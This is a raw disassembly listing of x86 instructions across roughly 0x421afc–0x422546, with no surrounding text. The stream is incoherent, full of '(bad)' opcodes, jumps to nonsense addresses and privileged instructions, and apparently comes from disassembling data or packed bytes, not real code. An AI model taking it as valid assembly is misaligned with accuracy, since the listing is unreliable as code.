  421afc:	mov    esi,0xe4fd8735
  421b01:	call   0xa65b:0x74d9ff05
  421b08:	dec    ebx
  421b09:	lahf   
  421b0a:	and    ebp,ebp
  421b0c:	pusha  
  421b0d:	cmp    bl,BYTE PTR [eax]
  421b0f:	mov    edi,0x0
	...
  421b74:	push   ss
  421b75:	cdq    
  421b76:	jmp    0x37400b48
  421b7b:	fild   DWORD PTR [ecx+eax*8+0x28]
  421b7f:	or     cl,BYTE PTR [eax+0x2863da26]
  421b85:	add    DWORD PTR [bx+si],eax
  421b88:	add    al,0x1
  421b8a:	add    BYTE PTR [eax],al
  421b8c:	popf   
  421b8d:	sbb    eax,0x22b6192c
  421b92:	fst    QWORD PTR [edx]
  421b94:	clc    
  421b95:	mov    bl,0xb6
  421b97:	outs   dx,DWORD PTR ds:[esi]
  421b98:	cmp    eax,0x1850d5f8
  421b9d:	(bad)  
  421b9e:	cld    
  421b9f:	jnp    0x421bed
  421ba1:	outs   dx,DWORD PTR ds:[esi]
  421ba2:	addr16 xchg edi,eax
  421ba4:	aaa    
  421ba5:	mov    bh,0x2c
  421ba7:	ret    
  421ba8:	aad    0xaf
  421baa:	mov    ebp,0x57440c97
  421baf:	inc    esi
  421bb0:	adc    eax,0x3069de0e
  421bb5:	(bad)  
  421bb6:	push   ebp
  421bb7:	sbb    ebp,esi
  421bb9:	jmp    0xce6affa7
  421bbe:	sti    
  421bbf:	out    0x9d,al
  421bc1:	mov    al,ds:0x489a86e2
  421bc6:	stos   BYTE PTR es:[edi],al
  421bc7:	add    DWORD PTR [ebx-0x7e],eax
  421bca:	jbe    0x421b5c
  421bcc:	xor    eax,0x5209e212
  421bd1:	push   ss
  421bd2:	sub    dl,ah
  421bd4:	jl     0x421b5e
  421bd6:	jle    0x421c52
  421bd8:	add    DWORD PTR ds:0xb0db44eb,esp
  421bde:	cmp    ch,BYTE PTR [ebx+0xd]
  421be1:	cwde   
  421be2:	push   ss
  421be3:	scas   al,BYTE PTR es:[edi]
  421be4:	out    dx,al
  421be5:	daa    
  421be6:	sbb    esp,DWORD PTR [esi-0x3c]
  421be9:	sbb    DWORD PTR [ebx-0x12],esp
  421bec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421bed:	pusha  
  421bee:	aad    0x27
  421bf0:	hlt    
  421bf1:	fild   DWORD PTR ds:0x5736b91c
  421bf7:	jne    0x421bb5
  421bf9:	inc    edi
  421bfa:	aas    
  421bfb:	mov    al,0x9c
  421bfd:	mov    bl,0xb5
  421bff:	push   ecx
  421c00:	push   esi
  421c01:	jmp    0x421bb1
  421c03:	or     esp,edi
  421c05:	loop   0x421c3d
  421c07:	jge    0x421bf2
  421c09:	jle    0x421b91
  421c0b:	mov    edi,0x71962bfa
  421c10:	(bad)  
  421c11:	jmp    DWORD PTR [ecx-0x4cedca52]
  421c17:	push   esp
  421c18:	add    al,0xbe
  421c1a:	mov    eax,0xb492a404
  421c1f:	jg     0x421bee
  421c21:	lds    ecx,FWORD PTR [esi-0x452141ad]
  421c27:	pop    esp
  421c28:	jnp    0x421bd3
  421c2a:	mov    ds:0xfd84688d,eax
  421c2f:	xor    dl,BYTE PTR [ebx]
  421c31:	pop    ds
  421c32:	push   0xa47b77c8
  421c37:	mov    dl,0x39
  421c39:	mov    ebp,0x19a2c310
  421c3e:	mov    es,WORD PTR [ecx-0x2e]
  421c41:	jl     0x421c55
  421c43:	outs   dx,DWORD PTR ds:[esi]
  421c44:	mov    ch,0x61
  421c46:	ss sub eax,0xcde4e61f
  421c4c:	out    0xce,eax
  421c4e:	(bad)  
  421c4f:	fwait
  421c50:	out    0x58,al
  421c52:	aam    0x73
  421c54:	sti    
  421c55:	retf   0x68f4
  421c58:	stc    
  421c59:	xor    BYTE PTR [esi],ah
  421c5b:	lahf   
  421c5c:	ficomp WORD PTR [eax-0x33bd458b]
  421c62:	push   ebp
  421c63:	jp     0x421be5
  421c65:	sub    DWORD PTR [edi+ebx*8],esi
  421c68:	jns    0x421c68
  421c6a:	adc    al,0x74
  421c6c:	mov    al,0x9c
  421c6e:	out    0x58,eax
  421c70:	cmp    cl,BYTE PTR [edi]
  421c72:	mov    dl,0x2f
  421c74:	rcl    DWORD PTR [edx+ebp*2+0x72],1
  421c78:	in     eax,0x34
  421c7a:	jmp    0x421caf
  421c7c:	mov    ch,0x58
  421c7e:	mov    dl,0x58
  421c80:	xchg   edx,eax
  421c81:	loopne 0x421c50
  421c83:	mov    ds:0xd7223b7e,eax
  421c88:	fimul  DWORD PTR [ebx+0x68f25701]
  421c8e:	outs   dx,BYTE PTR ds:[esi]
  421c8f:	jmp    0x0:0x0
	...
  421cf2:	add    BYTE PTR [eax],al
  421cf4:	mov    al,0x6b
  421cf6:	mov    ch,0xe5
  421cf8:	(bad)  
  421cf9:	push   eax
  421cfb:	jg     0x421d51
  421cfd:	dec    edi
  421cfe:	xchg   edx,eax
  421cff:	dec    edi
  421d00:	add    al,0x3a
  421d02:	jae    0x421cee
  421d04:	sub    al,0x68
  421d06:	add    DWORD PTR [eax],eax
  421d08:	add    al,0x1
  421d0a:	add    BYTE PTR [eax],al
  421d0c:	ja     0x421cee
  421d0e:	and    ch,BYTE PTR [edi+esi*1]
  421d11:	inc    ebx
  421d12:	je     0x421c98
  421d14:	mov    bh,al
  421d16:	pop    esp
  421d17:	stc    
  421d18:	mov    dh,0xb4
  421d1a:	sbb    DWORD PTR [edx-0x313177ff],esp
  421d20:	inc    edi
  421d21:	xchg   ebp,eax
  421d22:	ja     0x421ce6
  421d24:	cmp    ch,al
  421d26:	fisttp DWORD PTR [edi+0x4f]
  421d29:	mov    DWORD PTR [edi],ebx
  421d2b:	mov    BYTE PTR [eax+0x58b450ec],cl
  421d31:	cmc    
  421d32:	xor    DWORD PTR [ebp+0x29],0x93f75473
  421d39:	or     DWORD PTR [edx],esi
  421d3b:	outs   dx,BYTE PTR ds:[esi]
  421d3c:	xchg   edi,eax
  421d3d:	dec    esi
  421d3e:	rcr    DWORD PTR [ebx+0x24],cl
  421d41:	adc    ecx,edi
  421d43:	fsubr  DWORD PTR [edx-0x616ad836]
  421d49:	in     al,0xb9
  421d4b:	mov    esi,0x51f4559
  421d50:	or     bh,BYTE PTR [ecx]
  421d52:	daa    
  421d53:	(bad)  
  421d54:	ss jo  0x421d32
  421d57:	je     0x421d81
  421d59:	add    al,0x90
  421d5b:	idiv   BYTE PTR [ebp+0x77760891]
  421d61:	mov    BYTE PTR ds:0x5570527b,dh
  421d67:	sub    BYTE PTR ds:0x2ffa4fbc,dl
  421d6d:	loopne 0x421dce
  421d6f:	lods   eax,DWORD PTR ds:[esi]
  421d70:	sbb    al,0x2b
  421d72:	les    ebp,FWORD PTR [eax-0x6c14e26d]
  421d78:	jno    0x421def
  421d7a:	jae    0x421d09
  421d7c:	sbb    DWORD PTR [esp+eax*8],ebx
  421d7f:	sub    edi,DWORD PTR [ecx]
  421d81:	adc    eax,0x848cc8d0
  421d86:	mov    al,ds:0x7c8e968
  421d8b:	mov    ebp,0xb035eb52
  421d90:	mov    dh,BYTE PTR gs:[eax+0x7174cac1]
  421d97:	sbb    BYTE PTR [ebp+0x79],bh
  421d9a:	pop    ecx
  421d9b:	loopne 0x421d35
  421d9d:	sub    BYTE PTR [edi],bl
  421d9f:	out    0x8a,al
  421da1:	xor    al,0x1
  421da3:	ds push 0xffffffc2
  421da6:	jp     0x421d9d
  421da8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421da9:	popf   
  421daa:	pop    eax
  421dab:	cmc    
  421dac:	sbb    bh,dh
  421dae:	test   al,0x44
  421db0:	loop   0x421d54
  421db2:	mov    ds:0xedf734a,al
  421db7:	pop    ebp
  421db8:	push   esp
  421db9:	xchg   esp,eax
  421dba:	pop    ds
  421dbb:	sbb    eax,DWORD PTR [eax+0x34299ad7]
  421dc1:	ins    DWORD PTR es:[edi],dx
  421dc2:	hlt    
  421dc3:	je     0x421dbe
  421dc5:	in     eax,0x45
  421dc7:	push   cs
  421dc8:	outs   dx,BYTE PTR ds:[esi]
  421dc9:	adc    ebx,ebp
  421dcb:	xchg   edi,eax
  421dcc:	fbld   TBYTE PTR [ecx-0x1d]
  421dcf:	scas   eax,DWORD PTR es:[edi]
  421dd0:	fs adc al,0x18
  421dd3:	inc    esi
  421dd4:	adc    DWORD PTR [esi+0x2e85bac7],esp
  421dda:	pop    esp
  421ddb:	fnstcw WORD PTR [ecx]
  421ddd:	xlat   BYTE PTR ds:[ebx]
  421dde:	add    BYTE PTR [esi+0x2a67b5ac],al
  421de4:	xlat   BYTE PTR ds:[ebx]
  421de5:	cs adc ecx,esp
  421de8:	iret   
  421de9:	and    ah,BYTE PTR [edx-0x3e849464]
  421def:	mov    ebp,0xd640663b
  421df4:	fs mov esi,0xfcd17b5f
  421dfa:	ja     0x421dba
  421dfc:	in     al,0x24
  421dfe:	shl    BYTE PTR [ebp+0x62],0xd9
  421e02:	mov    dl,0x6c
  421e04:	(bad)  
  421e06:	jne    0x421e83
  421e08:	push   ss
  421e09:	in     al,dx
  421e0a:	dec    ebx
  421e0b:	cmp    dl,BYTE PTR [edx+0xad958f]
	...
  421e71:	add    BYTE PTR [eax],al
  421e73:	add    bh,cl
  421e75:	mov    eax,ds:0xbf7f851b
  421e7a:	fucomip st,st(3)
  421e7c:	push   es
  421e7d:	ins    BYTE PTR es:[edi],dx
  421e7e:	xor    al,0xb9
  421e80:	or     BYTE PTR [edi],cl
  421e82:	dec    esi
  421e83:	div    BYTE PTR [eax]
  421e85:	imul   eax,DWORD PTR [ecx],0x10400
  421e8b:	add    BYTE PTR [ecx+0x4f],al
  421e8e:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  421e90:	dec    eax
  421e91:	xchg   esi,eax
  421e92:	dec    esp
  421e93:	push   esp
  421e94:	add    al,BYTE PTR [esp+eiz*2]
  421e97:	cdq    
  421e98:	dec    esi
  421e99:	push   esi
  421e9a:	add    BYTE PTR [eax-0x13],dh
  421e9d:	dec    edx
  421e9e:	sbb    eax,0x13365380
  421ea3:	fs in  al,0x17
  421ea6:	adc    BYTE PTR [esi-0x2f],0x11
  421eaa:	jae    0x421e85
  421eac:	mov    bl,0x23
  421eae:	ror    DWORD PTR [edx+0x4],0xd
  421eb2:	adc    esp,DWORD PTR [ebp-0x74]
  421eb5:	(bad)  
  421eb7:	loop   0x421f16
  421eb9:	(bad)
  421ebc:	jne    0x421e40
  421ebe:	inc    ecx
  421ebf:	jne    0x421f04
  421ec1:	std    
  421ec2:	jge    0x421e7f
  421ec4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ec5:	sub    esi,DWORD PTR [edi-0x291eae92]
  421ecb:	imul   edi,DWORD PTR [ecx+0x52637da2],0x37c99659
  421ed5:	xchg   esi,eax
  421ed6:	mov    BYTE PTR [edi+0x1d],ch
  421ed9:	les    edx,FWORD PTR [ebx+ebx*8]
  421edc:	test   BYTE PTR [esi+edx*4-0x34],0x72
  421ee1:	sub    ebx,eax
  421ee3:	out    dx,al
  421ee4:	imul   esp,ebx,0x7b7a904b
  421eea:	inc    eax
  421eeb:	sub    BYTE PTR [esi+ecx*4+0x55],bl
  421eef:	imul   ecx,DWORD PTR [ecx-0xd95c9fe],0x31c47f3e
  421ef9:	sbb    bh,ch
  421efb:	sbb    al,0x5d
  421efd:	gs aad 0x8a
  421f00:	es add eax,0x898e6eb6
  421f06:	test   BYTE PTR [ecx-0x4a42d41d],ch
  421f0c:	ss in  al,0xc7
  421f0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f10:	and    BYTE PTR [edx+0x69],al
  421f13:	stos   DWORD PTR es:[edi],eax
  421f14:	pusha  
  421f15:	inc    al
  421f17:	sub    al,0xc8
  421f19:	mov    al,BYTE PTR [edx]
  421f1b:	(bad)  
  421f1c:	jo     0x421eca
  421f1e:	push   0xfffffff8
  421f20:	test   al,0x3f
  421f22:	jmp    0xb46547bb
  421f27:	leave  
  421f28:	(bad)  
  421f29:	outs   dx,BYTE PTR ds:[esi]
  421f2a:	sbb    al,BYTE PTR [edi-0x4c]
  421f2d:	cmp    eax,0x1c02c1dd
  421f32:	xchg   edi,eax
  421f33:	push   cs
  421f34:	mov    esi,0x93ff909
  421f39:	sub    al,BYTE PTR [ebx]
  421f3b:	shl    edx,1
  421f3d:	mov    ebp,0xe113aa16
  421f42:	xor    BYTE PTR [edx-0x516dc4d9],bh
  421f48:	push   cs
  421f49:	mov    edx,0x40bda4a3
  421f4e:	int    0x99
  421f50:	(bad)  
  421f51:	xrelease mov BYTE PTR [edx-0x1fdb7cca],cl
  421f58:	ds daa 
  421f5a:	xchg   ebp,eax
  421f5b:	mov    ?,WORD PTR [ecx-0x3a9fc7d7]
  421f61:	push   ecx
  421f62:	mov    ecx,0x35edf604
  421f67:	into   
  421f68:	pop    esi
  421f69:	cmp    eax,0x1683b7d0
  421f6e:	sub    DWORD PTR [ebp-0x3fab118],0xffffffb9
  421f75:	xchg   edi,eax
  421f76:	add    eax,0xa9da3a6e
  421f7b:	repnz sub edx,DWORD PTR ss:[ebx]
  421f7f:	inc    ecx
  421f80:	sar    DWORD PTR [edi],0x15
  421f83:	jns    0x421f72
  421f85:	jmp    DWORD PTR [ecx+esi*4+0x3cfc43f9]
  421f8c:	mov    al,0x59
  421f8e:	ret    
  421f8f:	enter  0x0,0x0
	...
  421ff3:	add    BYTE PTR [ebx+0x6],ch
  421ff6:	(bad)  
  421ff7:	dec    edi
  421ff8:	out    dx,eax
  421ff9:	iret   
  421ffa:	jmp    0x422022
  421ffc:	aas    
  421ffd:	in     eax,dx
  421ffe:	push   es
  421fff:	add    ax,WORD PTR [esi+0x6a34ae8c]
  422006:	add    DWORD PTR [eax],eax
  422008:	add    al,0x1
  42200a:	add    BYTE PTR [eax],al
  42200c:	das    
  42200d:	jo     0x422025
  42200f:	hlt    
  422010:	test   al,0xd9
  422012:	ja     0x42205a
  422014:	adc    eax,0x4f8005ff
  422019:	jge    0x421fbb
  42201b:	stc    
  42201c:	fcom   QWORD PTR [eax+0x36a528ce]
  422022:	ss pop ecx
  422024:	push   ecx
  422025:	test   BYTE PTR [esi],cl
  422027:	jg     0x422024
  422029:	add    cl,BYTE PTR [eax-0x7530e9d5]
  42202f:	outs   dx,DWORD PTR ds:[esi]
  422030:	adc    BYTE PTR [edi],bl
  422032:	push   0xffffff80
  422034:	xor    DWORD PTR [edx],edi
  422036:	mov    esi,0xd7ea1cda
  42203b:	add    eax,0x5613d70
  422040:	stc    
  422041:	jne    0x4220c1
  422043:	ds jecxz 0x42203c
  422046:	mov    cl,0x31
  422048:	sbb    bh,BYTE PTR [esi]
  42204a:	mov    edx,0x16641d54
  42204f:	out    dx,al
  422050:	push   edi
  422051:	hlt    
  422052:	mov    ebx,DWORD PTR ds:0x83140dae
  422058:	aas    
  422059:	stc    
  42205a:	in     eax,dx
  42205b:	outs   dx,BYTE PTR ds:[esi]
  42205c:	pop    edx
  42205d:	leave  
  42205e:	test   ebx,ebx
  422060:	push   cs
  422061:	fs jbe 0x421fea
  422064:	je     0x42202b
  422066:	scas   eax,DWORD PTR es:[edi]
  422067:	mov    al,ds:0x440b5cd5
  42206c:	xchg   BYTE PTR [ebx+0x37],dl
  42206f:	sbb    eax,DWORD PTR [edi]
  422071:	pop    ebp
  422072:	inc    ecx
  422073:	pop    esi
  422074:	test   DWORD PTR [edx+eax*2],0x7036c350
  42207b:	(bad)  
  42207c:	in     eax,dx
  42207d:	jno    0x4220e3
  42207f:	mov    cl,0x6e
  422081:	inc    edi
  422082:	mov    DWORD PTR [ecx-0x7ebdf131],edx
  422088:	mov    ecx,tr7
  42208b:	push   esi
  42208c:	mov    edi,0xa7312de3
  422091:	xchg   edi,eax
  422092:	jecxz  0x4220ec
  422094:	rol    DWORD PTR [ecx+0x4bc4e94],1
  42209a:	or     BYTE PTR [ebp-0x477bf924],bh
  4220a0:	(bad)  
  4220a1:	retf   
  4220a2:	fs jno 0x4220b4
  4220a5:	dec    ecx
  4220a6:	push   ecx
  4220a7:	out    dx,al
  4220a8:	xor    ah,bh
  4220aa:	push   0xffffffe5
  4220ac:	mov    dh,0xc3
  4220ae:	mov    esi,0xab61efd9
  4220b3:	jg     0x42206f
  4220b5:	mov    ebp,0x1109479d
  4220ba:	ja     0x422132
  4220bc:	dec    BYTE PTR [eax+0x6b]
  4220bf:	push   ecx
  4220c0:	int3   
  4220c1:	sbb    DWORD PTR [edx+0x4c],eax
  4220c4:	retf   
  4220c5:	fwait
  4220c6:	(bad)  
  4220c7:	out    0x8f,al
  4220c9:	sub    al,BYTE PTR ds:0x6f22c271
  4220cf:	je     0x422091
  4220d1:	dec    edx
  4220d2:	(bad)  
  4220d3:	cmp    eax,0x64eb81ae
  4220d8:	or     edi,DWORD PTR [eax+ecx*2+0x7f]
  4220dc:	or     BYTE PTR [edx],0x38
  4220df:	inc    ebx
  4220e0:	adc    ebp,DWORD PTR [ecx+0x3acf0996]
  4220e6:	in     al,dx
  4220e7:	in     eax,dx
  4220e8:	es cwde 
  4220ea:	and    eax,0x2c68dd67
  4220ef:	mov    bl,BYTE PTR [edx+0x5bc88046]
  4220f5:	dec    edx
  4220f6:	pop    ds
  4220f7:	pop    ecx
  4220f8:	pop    ecx
  4220f9:	shr    BYTE PTR [edi-0x355ebb66],cl
  4220ff:	pop    es
  422100:	cmc    
  422101:	and    esp,DWORD PTR [eax+0x70eddf9a]
  422107:	mov    al,ds:0x9e4389d9
  42210c:	mov    ah,0x89
  42210e:	std    
  42210f:	inc    esi
	...
  422174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422175:	push   edx
  422176:	jnp    0x422175
  422178:	(bad)  
  422179:	std    
  42217a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217b:	pop    ebx
  42217c:	dec    edx
  42217d:	sub    al,0x42
  42217f:	sub    esi,DWORD PTR [esi+0x38c92255]
  422185:	imul   eax,DWORD PTR [ecx],0x0
  422188:	add    al,0x1
  42218a:	add    BYTE PTR [eax],al
  42218c:	fisub  WORD PTR [ebp-0x2c]
  42218f:	push   ecx
  422190:	xor    DWORD PTR [esi+0x7a],ecx
  422193:	jge    0x42212f
  422195:	je     0x42212a
  422197:	icebp  
  422198:	mov    dh,0x9a
  42219a:	and    BYTE PTR [eax+esi*1+0x14364e43],bl
  4221a1:	xor    eax,0xe07ec02e
  4221a6:	and    al,0xbd
  4221a8:	cmp    bh,ah
  4221aa:	stos   DWORD PTR es:[edi],eax
  4221ab:	dec    eax
  4221ac:	scas   eax,DWORD PTR es:[edi]
  4221ad:	mul    DWORD PTR [edx]
  4221af:	mov    ecx,0xbbba88ed
  4221b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221b5:	push   esi
  4221b6:	push   ss
  4221b7:	sahf   
  4221b8:	loopne 0x4221e1
  4221ba:	cmp    al,0x71
  4221bc:	add    bl,BYTE PTR [edi]
  4221be:	xor    DWORD PTR [eax+0x6c],ebp
  4221c1:	jbe    0x422146
  4221c3:	rcr    BYTE PTR [ecx-0x4f11d51b],cl
  4221c9:	xor    BYTE PTR [edi+0x77],ah
  4221cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221cd:	dec    edi
  4221ce:	bound  edx,QWORD PTR [eax]
  4221d0:	ret    0xf016
  4221d3:	nop
  4221d4:	jo     0x51ca634c
  4221da:	test   al,0x61
  4221dc:	es or  eax,0xfedadba2
  4221e2:	cli    
  4221e3:	dec    ebp
  4221e4:	div    bh
  4221e6:	inc    edi
  4221e7:	(bad)  
  4221e9:	xchg   ebx,eax
  4221ea:	sub    eax,0x7ff95c02
  4221ef:	push   esi
  4221f0:	iret   
  4221f1:	into   
  4221f2:	xchg   edi,eax
  4221f3:	loopne 0x4221f4
  4221f5:	je     0x4221ac
  4221f7:	scas   eax,DWORD PTR es:[edi]
  4221f8:	loopne 0x422211
  4221fa:	jmp    0x1d32c743
  4221ff:	adc    cl,BYTE PTR [eax]
  422201:	and    ah,ch
  422203:	adc    ebx,DWORD PTR [ecx]
  422205:	cmp    ecx,DWORD PTR [ebx+0x48]
  422208:	mov    edi,DWORD PTR [eax+ebp*4+0x21]
  42220c:	push   es
  42220d:	or     DWORD PTR [edi],esp
  42220f:	fsubrp st(2),st
  422211:	sbb    esp,DWORD PTR [edi-0x22955623]
  422217:	jmp    0xbe2b:0x7dac671b
  42221e:	popf   
  42221f:	mov    edi,0x67ce9459
  422224:	jb     0x422206
  422226:	test   al,0x2d
  422228:	dec    edx
  422229:	fild   DWORD PTR [ecx+0x2e]
  42222c:	rcl    DWORD PTR [ebp-0x3f63cedb],0xe
  422233:	rcr    DWORD PTR [esi+0x691202b],cl
  422239:	nop
  42223a:	scas   eax,DWORD PTR es:[edi]
  42223b:	ins    DWORD PTR es:[edi],dx
  42223c:	lods   al,BYTE PTR ds:[esi]
  42223d:	rol    eax,1
  42223f:	in     eax,dx
  422240:	xor    DWORD PTR [ebp-0x6c],esp
  422243:	add    BYTE PTR [edx+0x30],0x7f
  422247:	in     eax,0xad
  422249:	or     al,0xe8
  42224b:	outs   dx,BYTE PTR ds:[esi]
  42224c:	and    eax,esp
  42224e:	push   edx
  42224f:	(bad)
  422252:	mov    ds:0x14d667e5,eax
  422258:	pavgw  mm5,QWORD PTR [edx]
  42225b:	mov    al,0x50
  42225d:	add    ah,BYTE PTR [ebp+0x4c]
  422260:	adc    eax,0x3cd45666
  422265:	mov    DWORD PTR [ebx],edi
  422267:	fistp  QWORD PTR [esi-0x1d]
  42226a:	xor    al,0x97
  42226c:	frstor [ebp+0x21b861c1]
  422272:	inc    ebp
  422273:	add    al,0x9d
  422275:	sub    DWORD PTR [ebx],ecx
  422277:	adc    BYTE PTR [ebp-0x14],bl
  42227a:	(bad)
  42227e:	ret    0x6ed4
  422281:	mov    ds:0xa5f1b044,eax
  422286:	sub    al,0x6c
  422288:	lods   al,BYTE PTR ds:[esi]
  422289:	mov    ebp,0x27caa868
  42228e:	mov    esi,0xfe
	...
  4222f3:	add    BYTE PTR [edi-0x10085213],cl
  4222f9:	neg    edi
  4222fb:	std    
  4222fc:	sub    ebx,DWORD PTR [ebp+0x71]
  4222ff:	dec    ecx
  422300:	stos   DWORD PTR es:[edi],eax
  422301:	xchg   DWORD PTR [edi-0x21],esi
  422304:	cmp    al,0x6c
  422306:	add    DWORD PTR [eax],eax
  422308:	add    al,0x1
  42230a:	add    BYTE PTR [eax],al
  42230c:	out    0xde,eax
  42230e:	sbb    DWORD PTR [ebx-0xc],ebp
  422311:	hlt    
  422312:	(bad)  
  422313:	adc    DWORD PTR [edi+0x21],edx
  422316:	fs cmp ebp,ebp
  422319:	and    DWORD PTR [edx-0x69],edi
  42231c:	cmc    
  42231d:	push   edx
  42231e:	das    
  42231f:	mov    al,ds:0xd9960d3b
  422324:	aas    
  422325:	sbb    BYTE PTR [ebp+0x4e89e95f],al
  42232b:	hlt    
  42232c:	into   
  42232d:	fs popa 
  42232f:	jge    0x422336
  422331:	jge    0x4222fb
  422333:	rol    DWORD PTR [edx-0x31],0x7b
  422337:	mov    esp,0xc514075a
  42233c:	cmp    al,BYTE PTR [edx-0x7da2efe3]
  422342:	adc    al,0x3f
  422344:	pop    ebx
  422345:	arpl   WORD PTR ds:0x9fbd4063,sp
  42234b:	xchg   ecx,eax
  42234c:	loope  0x42235b
  42234e:	mov    eax,ds:0xd8ac914
  422353:	jmp    0x8a590cf
  422358:	nop
  422359:	and    dh,BYTE PTR ds:0x4a88538d
  42235f:	xor    ecx,DWORD PTR [esi]
  422361:	std    
  422362:	mov    al,ss:0x63e665f4
  422368:	inc    ebp
  422369:	push   edi
  42236a:	outs   dx,BYTE PTR ds:[esi]
  42236b:	xor    BYTE PTR [esi+0x6b],0x5a
  42236f:	mov    edx,0x70686914
  422374:	retf   
  422375:	jmp    0x422392
  422377:	aam    0x1f
  422379:	dec    ecx
  42237a:	cmp    ebx,DWORD PTR [ecx-0x27]
  42237d:	cmp    DWORD PTR [edx],eax
  42237f:	mov    ebx,DWORD PTR [ebx-0x6f]
  422382:	xchg   esp,eax
  422383:	xlat   BYTE PTR ds:[ebx]
  422384:	xchg   ebx,eax
  422385:	jb     0x4223cc
  422387:	(bad)  
  422388:	sbb    eax,0xa9bfb05d
  42238d:	pop    ebx
  42238e:	dec    ebp
  42238f:	daa    
  422390:	jmp    0xc10b6f04
  422395:	(bad)  [edx]
  422397:	inc    edi
  422398:	sbb    al,0xfc
  42239a:	xor    dh,BYTE PTR [ebx-0x4a8cd996]
  4223a0:	pop    ebx
  4223a1:	sub    BYTE PTR [edi+ebp*4],ch
  4223a4:	std    
  4223a5:	ss mov edx,0x60672eb1
  4223ab:	adc    al,al
  4223ad:	jne    0x4223f3
  4223af:	cmp    DWORD PTR [edi],edx
  4223b1:	ss sub al,0x35
  4223b4:	lds    ecx,FWORD PTR [ebx-0x40]
  4223b7:	jge    0x4223a5
  4223b9:	pusha  
  4223ba:	push   ecx
  4223bb:	stos   BYTE PTR es:[edi],al
  4223bc:	push   ebx
  4223bd:	loop   0x42243b
  4223bf:	mov    ah,0xd3
  4223c1:	xor    DWORD PTR [eax+0x5b],edx
  4223c4:	dec    edi
  4223c5:	push   ecx
  4223c6:	shl    DWORD PTR [edi],1
  4223c8:	add    al,0x23
  4223ca:	je     0x422417
  4223cc:	dec    eax
  4223cd:	mov    dh,0x7
  4223cf:	pop    ds
  4223d0:	(bad)  
  4223d1:	aam    0x48
  4223d3:	int3   
  4223d4:	repnz mul BYTE PTR [edx-0x71]
  4223d8:	jp     0x422389
  4223da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223db:	mov    ?,WORD PTR ds:0x38da22a9
  4223e1:	mov    ds:0x81feba48,eax
  4223e6:	jmp    0xe5d2b3c0
  4223eb:	jle    0x4223c9
  4223ed:	pop    eax
  4223ee:	or     bh,bh
  4223f0:	pop    esi
  4223f1:	push   ss
  4223f2:	add    esp,ebx
  4223f4:	xlat   BYTE PTR ds:[ebx]
  4223f5:	mov    bl,0x84
  4223f7:	mov    ah,0x63
  4223f9:	mov    ebx,0xb67085d
  4223fe:	pop    ebx
  4223ff:	pop    edi
  422400:	idiv   BYTE PTR [ebx+0x32]
  422403:	lea    edx,[eax]
  422405:	mov    ebp,0x79a04132
  42240a:	(bad)  
  42240b:	int    0x64
  42240d:	outs   dx,DWORD PTR ds:[esi]
  42240e:	mov    bl,0xd5
	...
  422474:	push   edx
  422475:	sub    BYTE PTR [esi],0x69
  422478:	(bad)  
  422479:	in     eax,dx
  42247a:	push   edi
  42247b:	mov    ebx,0x99e531bb
  422480:	and    al,0x78
  422482:	call   0x400:0x16d406c
  422489:	add    DWORD PTR [eax],eax
  42248b:	add    BYTE PTR [esi+ebp*2],dh
  42248e:	push   ebx
  42248f:	es push edx
  422491:	pushf  
  422492:	test   BYTE PTR [ebx-0x48],cl
  422495:	jb     0x422454
  422497:	jmp    0x422435
  422499:	inc    edi
  42249a:	loop   0x4224b0
  42249c:	lock adc eax,0x4f5739f6
  4224a2:	loop   0x422482
  4224a4:	or     eax,0xbb88d4c
  4224a9:	out    0x3b,al
  4224ab:	enter  0x2c03,0xe3
  4224af:	mov    dh,BYTE PTR [ebp+0x3a]
  4224b2:	out    dx,eax
  4224b3:	je     0x422468
  4224b5:	adc    dh,BYTE PTR [ecx]
  4224b7:	mov    cl,0x5
  4224b9:	inc    ecx
  4224ba:	mov    ebp,DWORD PTR [edi+eiz*4]
  4224bd:	in     eax,0x8d
  4224bf:	gs jae 0x422456
  4224c2:	xor    al,0x32
  4224c4:	ficom  WORD PTR [ecx-0x26]
  4224c7:	mov    esi,0x122f085f
  4224cc:	pand   mm2,mm5
  4224cf:	adc    edx,DWORD PTR [ecx+0x153f7df4]
  4224d5:	out    0xa3,eax
  4224d7:	fucomip st,st(4)
  4224d9:	sbb    al,0x19
  4224db:	xor    eax,0xf5362ce4
  4224e0:	jo     0x4224be
  4224e2:	push   ebx
  4224e3:	dec    edx
  4224e4:	xor    BYTE PTR ds:0xec6c6d7f,ah
  4224ea:	jmp    0x422532
  4224ec:	and    al,0xc3
  4224ee:	(bad)  
  4224ef:	test   DWORD PTR [ebx],0xb56af407
  4224f5:	adc    BYTE PTR [esi],dh
  4224f7:	mov    WORD PTR [esi-0x2d],es
  4224fa:	bound  eax,QWORD PTR [ecx+0x63]
  4224fd:	ja     0x4224be
  4224ff:	sbb    al,0xb4
  422501:	xor    al,0xec
  422503:	pop    edx
  422504:	pop    esi
  422505:	cld    
  422506:	mov    ecx,0xea7d2295
  42250b:	xchg   DWORD PTR [ecx+0x1bbe3a3],ebx
  422511:	xchg   BYTE PTR [ebx-0x1a1c7b9a],bl
  422517:	pop    ebx
  422518:	out    dx,al
  422519:	push   ds
  42251a:	aam    0xb1
  42251c:	icebp  
  42251d:	inc    edi
  42251e:	lods   eax,DWORD PTR ds:[esi]
  42251f:	scas   eax,DWORD PTR es:[edi]
  422520:	test   BYTE PTR [edi],ah
  422522:	loop   0x4224a7
  422524:	loope  0x4224ca
  422526:	adc    BYTE PTR [ebx-0x3c650a41],ah
  42252c:	inc    esp
  42252d:	inc    ecx
  42252e:	and    dl,BYTE PTR [ebx]
  422530:	(bad)  
  422531:	fld    TBYTE PTR [ebp+0x563e7dcc]
  422537:	add    BYTE PTR [edi-0x58],bl
  42253a:	outs   dx,DWORD PTR ds:[esi]
  42253b:	ret    0x832b
  42253e:	je     0x42254d
  422540:	(bad)  
  422541:	stos   DWORD PTR es:[edi],eax
  422542:	outs   dx,BYTE PTR ds:[esi]
  422543:	je     0x4224f2
  422545:	push   ecx
  422546:	mov    ecx,0x91fb6f36
